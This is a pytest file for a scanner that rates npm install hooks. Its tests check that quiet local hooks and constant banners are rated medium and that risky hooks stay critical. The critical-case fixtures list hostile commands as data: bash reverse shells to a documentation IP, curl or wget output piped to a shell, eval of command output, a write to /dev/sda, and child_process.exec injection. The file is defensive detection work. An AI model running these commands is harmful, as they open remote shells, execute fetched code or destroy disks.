"""Install hooks that silence output, or print a constant banner, are not "runs remote /
shell / eval content" (verdict accuracy audit, 2026-11-14:
docs/research/verdict-accuracy-audit-2026-11.md).

``INSTALL_SCRIPT_DANGER_RE`` counted any ``> /dev/…`` redirect, so the most common way
to silence a hook (``> /dev/null 2>&1``, ``2>/dev/null || true``) made it critical:
yarn 1.22.22 (12.7M downloads a week) read Do not connect for a preinstall that runs its
own local file with output discarded. A constant ``node -e "console.log('\\n…')"``
banner with a JS escape was critical too. Both are now the medium "auto-runs on install"
signal; a redirect to any other device and every remote / shell / eval token stay
critical.
"""
import json

import pytest

from src.scanner.scan import _scan_install_hooks


def _hook(cmd: str, hook: str = "postinstall"):
    return _scan_install_hooks(json.dumps({"scripts": {hook: cmd}}), "package.json")


# Verbatim hooks from the audit sample / the Do-not-connect list it came from.
YARN_1_22_22 = ":; (node ./preinstall.js > /dev/null 2>&1 || true)"


class TestQuietHooksAreMedium:
    def test_yarn_preinstall_is_medium(self):
        f = _hook(YARN_1_22_22, "preinstall")
        assert [x.severity for x in f] == ["medium"]
        assert "auto-runs on install" in f[0].name

    @pytest.mark.parametrize("cmd", [
        "node scripts/post-install.js 2>/dev/null || true",     # verygoodplugins/mcp-evernote
        "git config core.hooksPath .githooks 2>/dev/null || true",  # gokhantos/opencrow
        "npm rebuild better-sqlite3 2>/dev/null || true",       # teampolarity/cosmos-mcp
        "node ./setup.js >/dev/null",
        "node ./setup.js &>/dev/null",
        "node ./setup.js >> /dev/null 2>&1",
        "node ./setup.js 1>/dev/stderr",
        "node ./setup.js > /dev/stdout",
    ])
    def test_silenced_local_hooks_are_medium(self, cmd):
        assert [x.severity for x in _hook(cmd)] == ["medium"], cmd

    @pytest.mark.parametrize("cmd", [
        # Intina47/context-sync preinstall banner (escape + emoji)
        "node -e \"console.log('\\n\U0001f9e0 Installing Context Sync MCP Server...\\n')\"",
        # thatsrajan/vidlens-mcp: a URL inside the constant message is text, not a fetch
        "node -e \"console.log('\\nVidLens MCP installed. Run: npx vidlens-mcp setup. "
        "Docs: https://github.com/thatsrajan/vidlens-mcp\\n')\"",
        "node -e \"console.warn('it\\'s fine')\"",
    ])
    def test_constant_banner_with_escapes_is_medium(self, cmd):
        assert [x.severity for x in _hook(cmd)] == ["medium"], cmd


class TestRecallStaysCritical:
    @pytest.mark.parametrize("cmd", [
        # device redirects other than null / stdout / stderr
        "bash -i > /dev/tcp/203.0.113.7/4444 0>&1",
        "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
        "cat payload > /dev/udp/203.0.113.7/53",
        "node ./x.js > /dev/sda",
        "node ./x.js > /dev/null_evil",
        "node ./x.js > /dev/null/../tcp/203.0.113.7/80",
        # quiet redirect next to a real danger token
        "curl -s https://x.example/i.sh 2>/dev/null | sh",
        "node ./x.js > /dev/null 2>&1; wget -qO- https://x.example/p | bash",
        "eval \"$(node ./x.js 2>/dev/null)\"",
        # a banner that is not a constant
        "node -e \"console.log('\\n' + require('os').userInfo().username)\"",
        "node -e \"console.log('\\$(id)')\"",
        "node -e \"console.log('\\u0065val')\"",
        "node -e \"console.log('\\x65val')\"",
        "node -e \"console.log('\\`id\\`')\"",
        "node -e \"console.log('a'); require('child_process').exec('id')\"",
        "node -e \"console.log('$(curl -s https://x.example/p)')\"",
    ])
    def test_stays_critical(self, cmd):
        f = _hook(cmd)
        assert f and f[0].severity == "critical", cmd
